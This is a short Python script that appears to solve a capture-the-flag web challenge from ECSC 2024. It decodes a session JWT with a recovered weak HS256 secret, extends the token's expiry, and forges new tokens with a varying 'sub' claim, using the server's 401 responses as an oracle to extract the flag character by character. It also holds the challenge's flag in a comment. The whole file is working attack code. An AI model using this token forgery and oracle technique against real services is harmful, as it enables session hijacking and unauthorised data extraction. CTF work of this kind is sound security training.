import json
import jwt
import random
import requests
import string

cookie = '''
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcxOTU4OTczMCwianRpIjoiYjY1YmY1ZmYtMjBlOC00MDkwLTlmN2MtMmZiMzIzODFiNDM1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImIxZTQxZTBlLTlhZTAtNDAyZC05Zjg0LTJlNDRhMTgwNTk2NCIsIm5iZiI6MTcxOTU4OTczMCwiY3NyZiI6IjVkNzcyNTJjLTA2YTItNDE0NC1hYjBmLWNiNjY0MjM5N2QyMCIsImV4cCI6MTcxOTU5MDYzMH0.xM34VXdPf0ieg0rhnhL9F4vyATWDJs-RIe5HV2ZGuPo
'''

URL = 'https://nwaf.ecsc24.hack.cert.pl/hello'
# URL = 'http://localhost:5000/flag'

secret = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00~'

data = jwt.decode(cookie.strip(), secret, algorithms=['HS256'])
data['exp'] = 1819590629

print(data)

flag = 'ecsc24{'
# flag = 'ecsc24{mowa_jest_srebrem_a_milczenie_owiec!}'

while '}' not in flag:
    for c in string.printable:
        new_flag = flag+c
        data['sub'] = new_flag[-4:]
        print('trying', data['sub'])
        new_cookie = jwt.encode(data, secret, algorithm='HS256')
        r = requests.get(URL, headers={
            'Cookie': 'access_token_cookie=' + new_cookie,
        })
        # print(r.status_code)
        if r.status_code == 401:
            print(new_flag)
            flag = new_flag
            break
